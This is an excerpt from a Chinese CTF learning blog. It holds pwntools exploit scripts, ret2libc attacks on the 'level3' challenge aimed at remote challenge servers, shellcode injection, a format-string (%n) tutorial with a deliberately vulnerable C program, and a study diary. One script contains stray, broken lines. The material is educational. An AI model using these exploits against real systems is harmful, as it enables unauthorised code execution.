class="hljs-string">&#x27;./string&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;secret[1] is &#x27;</span>)<br>a = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x&#x27;</span>+r.recvline(),base=<span class="hljs-number">16</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name be:\n&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;up?:\n&#x27;</span>,<span class="hljs-string">&#x27;east&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;leave(0)?:\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;address&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(a))<br>r.sendlineafter(<span class="hljs-string">&#x27;wish is:\n&#x27;</span>,payload)<br>r.sendlineafter(<span class="hljs-string">&#x27;SPELL\n&#x27;</span>,asm(shellcraft.amd64.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))<br><span class="hljs-comment">#当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。</span><br><span class="hljs-comment">#获得执行system(“/bin/sh”)汇编代码所对应的机器码： asm(shellcraft.sh()) 。注意要指明arch和os。arch有</span><br><span class="hljs-comment">#i386(x86)和amd64(x64)。攻防世界的题解区有人说这个函数失效，其实是因为他没指明环境。不同环境下的汇编代</span><br><span class="hljs-comment">#码是不同的。</span><br>r.interactive()<br><br><span class="hljs-comment">#AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-</span><br></code></pre></div></td></tr></table></figure><h2 id="11-level3"><a href="#11-level3" class="headerlink" title="11 level3"></a>11 level3</h2><h3 id="11-1-checksec"><a href="#11-1-checksec" class="headerlink" title="11.1 checksec"></a>11.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/kwIAFZPTb5BuMfV.png" alt="28"></p><h3 id="11-2-找漏洞"><a href="#11-2-找漏洞" class="headerlink" title="11.2 找漏洞"></a>11.2 找漏洞</h3><p>开IDA看看，看到有一个read的栈溢出。</p><p><img src="https://i.loli.net/2021/07/19/4SCUlP8QLGINi7k.png" alt="29"></p><p>只有write和read函数，那只能通过泄露libc的基址来调用<code>system(&#39;/bin/sh&#39;)</code>了。</p><p>我们可以知道的有：write函数的plt表位置和got表位置。由于在read函数之前已经调用过write函数了，即已经完成了延迟绑定，那么got表中已经记录了write的地址，由于libc的函数偏移值是固定的，则可以获得libc的基址，并得到system函数的实际地址。</p><h3 id="11-3-脚本"><a href="#11-3-脚本" class="headerlink" title="11.3 脚本"></a>11.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>aaaa<br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>DEBUG = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> DEBUG == <span class="hljs-number">1</span>:<br>p = process(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>,<span class="hljs-number">56008</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(write_plt)  + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#从这里跳转到write函数中,默认当前栈顶就是返回地址,下面的依次是参数1-n(先压参数再返回地址)</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>p.sendline(payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<span class="hljs-comment">#unpack() 这里是write函数输出的got</span><br><br><span class="hljs-comment">#print(hex(write_addr))</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<span class="hljs-comment">#重新进入main函数</span><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = (write_addr - write_libc)<span class="hljs-string">&#x27;&#x27;&#x27;这玩意儿是基址&#x27;&#x27;&#x27;</span> + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = (write_addr - write_libc) + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr) <br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;111.200.241.244&#x27;</span>, <span class="hljs-number">63933</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = write_addr - write_libc + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh_addr = write_addr - write_libc + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(sys_addr) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + sh_addr<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn题:格式化输出字符串漏洞</title>
    <link href="/2021-07/pwn-ctf-pwn1/"/>
    <url>/2021-07/pwn-ctf-pwn1/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn：格式化字符串漏洞"><a href="#pwn：格式化字符串漏洞" class="headerlink" title="pwn：格式化字符串漏洞"></a>pwn：格式化字符串漏洞</h1><p>CTF——PWN的基础漏洞类型。 </p><h2 id="1-printf函数的格式化字符串漏洞"><a href="#1-printf函数的格式化字符串漏洞" class="headerlink" title="1 printf函数的格式化字符串漏洞"></a>1 printf函数的格式化字符串漏洞</h2><h3 id="1-1-printf函数"><a href="#1-1-printf函数" class="headerlink" title="1.1 printf函数"></a>1.1 printf函数</h3><p>printf()函数是格式化输出函数, 一般用于向准则输出设备按规定式样输出消息。<br>函数的原型为：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br></code></pre></div></td></tr></table></figure><p>printf()函数的调用格式为:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&lt;格式化字符串&gt;&quot;</span>, &lt;参量表&gt;);<br></code></pre></div></td></tr></table></figure><p>其中格式化字符串包括两部分内容: 一部分是正常字符, 这些字符将按原样输出; 另一部分是格式化规定字符, 以”%”开始, 后跟一个或几个规定字符,用来确定输出内容格式。参量表是需要输出的一系列参数, 其个数必须与格式化字符串所说明的输出参数个数一样多, 各参数之间用”,”分开, 且顺序一一对应, 否则将会出现意想不到的错误。</p><p>printf()函数的大家族：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">snprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vprintf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vdprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsnprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_lis t ap)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li>fprintf()按照格式字符串的内容将输出写入流中。三个参数为流、格式字符串和变参列表。</li><li>printf()等同于fprintf()，但是它假定输出流为stdout。 </li><li>sprintf()等同于fprintf()，但是输出不是写入流而是写入数组。在写入的字符串末尾必须添加一个空字符。</li><li>snprintf()等同于sprintf()，但是它指定了可写入字符的最大值size。当size大于零时，输出字符超过第size-1的部分会被舍弃而 不会写入数组中，在写入数组的字符串末尾会添加一个空字符。</li><li>dprintf()等同于fprintf()，但是它输出不是流而是一个文件描述符fd 。</li><li>vfprintf()、vprintf()、vsprintf()、vsnprintf()、vdprintf()分别与上面的函数对应，只是它们将变参列表换成了va_list类型的参数。</li></ul><h3 id="1-2-格式字符串format"><a href="#1-2-格式字符串format" class="headerlink" title="1.2 格式字符串format"></a>1.2 格式字符串format</h3><p>格式字符串是由普通字符（ordinary character，包括 % ）和转换规则（conversion specification）构成的字符序列。普通字符被原封不动地复制到输出流中。转换规则根据与实参对应的转换指示符对其进行转换，然后将结果写入输出流中。<br>一个转换规则有可选部分和必需部分组成：</p><div class="hljs code-wrapper"><pre><code>%[ 参数 ][ 标志 ][ 宽度 ][ .精度 ][ 长度 ] 转换指示符</code></pre></div><ul><li>（必需）转换指示符：</li></ul><table><thead><tr><th>字符</th><th align="left">描述</th></tr></thead><tbody><tr><td>d,i</td><td align="left">有符号十进制数值<code>int</code>。<code>%d</code> 与<code>%i </code>对于输出是同义；但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或<code>0</code>时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>u</td><td align="left">十进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>f,F</td><td align="left"><code>double</code>型输出10进制定点表示。<code>f </code>与 <code>F</code> 差异是表示无穷与NaN时，<code>f</code>输出<code>inf</code>, <code>infinity</code>与 <code>nan</code>；<code>F</code> 输出<code>INF</code>, <code>INFINITY</code>与<code>NAN</code>。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td></tr><tr><td>e,E</td><td align="left"><code>double</code>值，输出形式为10进制的<code>([ - ]d.ddd e [ + / - ]ddd)</code>. E版本使用的指数符号为<code>E</code>（而不是<code>e</code>）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数<code>_set_output_format</code>修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td></tr><tr><td>g,G</td><td align="left"><code>double</code>型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,精度] 内，输出为定点形式；否则输出为指数浮点形式。<code>g</code>使用小写字母，<code>G</code>使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td></tr><tr><td>x,X</td><td align="left">16进制<code>unsigned int</code>。<code>x</code>使用小写字母；<code>X</code>使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>o</td><td align="left">8进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>s</td><td align="left">如果没有用<code>l</code>标志，输出<code>null</code>结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了<code>l</code>标志，则对应函数参数指向<code>wchar_t</code>型的数组，输出时把每个宽字符转化为多字节字符，相当于调用<code>wcrtomb</code> 函数。</td></tr><tr><td>c</td><td align="left">如果没有用<code>l</code>标志，把<code>int</code>参数转为<code>unsigned char</code>型输出；如果用了<code>l</code>标志，把<code>wint_t</code>参数转为包含两个元素的 <code>chart_t</code>数组，其中第一个元素包含要输出的字符，第二个元素为<code>null</code>宽字符。</td></tr><tr><td>p</td><td align="left">void*型，输出对应变量的值。 <code>printf(&quot;%p&quot;, a)</code>用地址的格式打印变量a的值， printf(“%p”, &amp;a) 打印变量a所在的地址。</td></tr><tr><td>a,A</td><td align="left">double<code>型的16进制表示，</code>[−]0xh.hhhh p±d<code>。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。</code>a<code>使用小写字母，</code>A`使用大写字母。</td></tr><tr><td>n</td><td align="left">不输出字符，但是把已经成功输出的字符个数写入对应的<strong>整型指针参数</strong>所指的变量。</td></tr><tr><td>%</td><td align="left"><code>% </code>字面值，不接受任何除了<code>参数</code>以外的部分。</td></tr></tbody></table><ul><li>（可选）参数 </li></ul><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td><code>n$</code></td><td><code>n</code>是用这个格式说明符显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。如果任意一个占位符使用了参数 ，则其他所有占位符必须也使用参数 。例：<code>printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)</code> 产生<code>17 0x11; 16 0x10</code></td></tr></tbody></table><p>剩下的略（有用再填）。</p><h3 id="1-3-在pwn中的应用"><a href="#1-3-在pwn中的应用" class="headerlink" title="1.3 在pwn中的应用"></a>1.3 在pwn中的应用</h3><p>看上去好像说，<code>printf</code>这个类型的函数只能输出啊。然而实际上，他有一个有趣的转换指示符，那就是：</p><p><code>%n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p><p>我们测试一下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">//printfn.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>a = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1234567890%n\n&quot;</span>,&amp;a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc printfn.c -o printfn</span><br><span class="hljs-meta">$</span><span class="bash"> ./printfn</span> <br>a = 1<br>1234567890<br>a = 10<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>你看，仅用标准输出语句就成功改写了a的值！</p><p>说到这里已经很清楚了，我们可以通过修改<strong>参数</strong>的值，来改写<strong>该值所对应的地址的值</strong>，使程序执行发生错误。</p><p>比如以下代码：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">//pwnit.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">80</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> a = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">int</span> *p = &amp;a;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br><span class="hljs-built_in">printf</span>(buf);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%x\n&quot;</span>,a);<br><span class="hljs-keyword">if</span>(a == <span class="hljs-number">0x10</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you pwn me!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们编译运行一下：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc pwnit.c -m32 -o pwnit</span><br>pwnit.c: In function ‘main’:<br>pwnit.c:8:9: warning: format not a string literal and no format arguments [-Wformat-security]<br>  printf(buf);<br>         ^<br><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span> <br>abcde<br>abcde<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>输入abcde似乎根本没用哦。。但是我们可以输入一个字符串看看，<code>int a = 5</code>这个变量声明在哪：</p><p>输入字符串：aaaa-%p-%p-%p-%p-%p-%p-%p-%p</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaa-%</span><span class="bash">p-%p-%p-%p-%p-%p-%p-%p-%p</span><br>aaaa-0x804a060-0xf75bca60-0x80485db-0x1-0x5-0xfff84494-0x4f3eea00-0xf77413dc-0xfff844c0<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>这个方法的重点在于：<strong>printf函数的参数是先被压入栈中后获取栈中的值或者地址作为参数的！</strong>当初没有想明白这个问题，困惑了好久。所以，我们发现，第5个参数的值是0x5，说明我们只要把第6个参数<code>（int* p）</code>改成0x10就可以了！</p><p>输入字符串：aaaaaaaaaaaaaaaa%6$n</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaaaaaaaaaaaaaa%</span><span class="bash">6<span class="hljs-variable">$n</span></span><br>aaaaaaaaaaaaaaaa<br>10<br>you pwn me!<br><span class="hljs-meta">$</span><br></code></pre></div></td></tr></table></figure><p>成功！</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Daily</title>
    <link href="/2021-06/Now-Sky-Learning-Daily/"/>
    <url>/2021-06/Now-Sky-Learning-Daily/</url>
    
    <content type="html"><![CDATA[<h2 id="属于pwn的时间"><a href="#属于pwn的时间" class="headerlink" title="属于pwn的时间:"></a>属于pwn的时间:</h2><h3 id="第0周-6-7-6-13"><a href="#第0周-6-7-6-13" class="headerlink" title="第0周:6/7-6/13"></a>第0周:6/7-6/13</h3><ul><li>11: 为了ida成功把kali2020.3整莫得了, 不想去研究怎么复原了, 直接重装了个kali2021.2, 以后一定弄<strong>快照</strong>.</li><li>12: 弄明白了cachelab的食用方法, 直接ctrlcv代码理解了下, 但是看起来还是有很多可以改进的地方, 暂时看不进去了. <ul><li>typora装的时候apt-key出问题, 其实还能用几年, 更modern的解决办法<a href="https://suay.site/?p=526">在这</a>(还没看).</li><li>问题列表还是Markdown靠谱, 思维导图线太多了, 用不上结构的优势, 除了笔记还是用md吧.</li></ul></li><li>13: 今天计划看看那啥buuoj的题目: 没看懂从哪开始, 还在wiki中<ul><li>typora linux版命令行启动好像有点问题</li><li>啥玩意儿啊, 根本不知道怎么开始做ctf题目-&gt;搞懂了ssh连接到靶机, 结果做到第二题发现是web, 请求学不到家干脆放弃了.</li><li>看了点讲座的内网穿透, 有丶意思, 可惜我没有这种需求</li></ul></li></ul><h3 id="第一周-6-14-6-20"><a href="#第一周-6-14-6-20" class="headerlink" title="第一周:6/14-6/20"></a>第一周:6/14-6/20</h3><ul><li>啥也没干, 复习周</li></ul><h3 id="第二周-6-21-6-27"><a href="#第二周-6-21-6-27" class="headerlink" title="第二周:6/21-6/27"></a>第二周:6/21-6/27</h3><p>……………..</p><h3 id="第一周-7-10-7-11"><a href="#第一周-7-10-7-11" class="headerlink" title="第一周:7/10-7/11"></a>第一周:7/10-7/11</h3><ul><li><strong>10,11: 直接盲选了一手系统安全, 要开始学逆向之类的东西了.</strong> <ul><li>看了看洛神的攻防世界的题解, 看了第一道题我就下载了pwntools ida peda这三个工具, 用了下checksec看看文件的类型, 再试了试nc命令连接到服务器, 运行一下就得到了flag</li><li>第二题是关于格式化字符串漏洞的, 看了老半天, 洛神直接写个很明显, 真不知道他写这个的时候是什么水平, 我还啥都不会呢. 哦对, 我看到一半他居然写了个python, 还是用的pwntools的接口, 人傻了, 明天入门python去, 然后再看看pwntools的python写法</li></ul></li></ul><h3 id="第二周-7-12-7-18"><a href="#第二周-7-12-7-18" class="headerlink" title="第二周:7/12-7/18"></a>第二周:7/12-7/18</h3><ul><li><p><strong>12:这周不做CG了, 开始研究CTF</strong>.</p><ul><li>今天先入门个python先.</li></ul></li><li><p><strong>13: 今天打算学习pwntools的用法</strong>.</p><ul><li>python看到了package,  看过了import, 各种基本类型的用法, 类还没看.</li><li><a href="https://pwntools.readthedocs.io/en/latest/tubes/sockets.html#module-pwnlib.tubes.remote">pwnlib.tubes</a>, 这里有很多东西, 可以直接网页打开然后去搜函数, unpack()和pack()的作用是将数字打包成可输入的字符串</li><li>vscode装python还是挺简单的</li><li><code>%&lt; number&gt;$x</code> 是直接存放到第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.<ul><li>在%10n是啥以及为啥要加‘AAAA’这些问题上卡了半天. <a href="https://bbs.pediy.com/thread-253638.htm">[0]</a>.</li><li><strong>除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。</strong> 注意是<strong>对应参数（这个参数是指针）</strong>的对应的地址开始起几个字节。<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">[0]</a>.</li></ul></li></ul></li><li><p><strong>14: IDA东西好多, 也看了看pwntools的文档, 特么也太多了</strong>.(level2整完了, 明天看看文档告别硬编码!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!(先会看再说))</p><ul><li><code>var_4 = dword ptr -4；</code>  这是解释代码，可解释成var_4 是 esp - 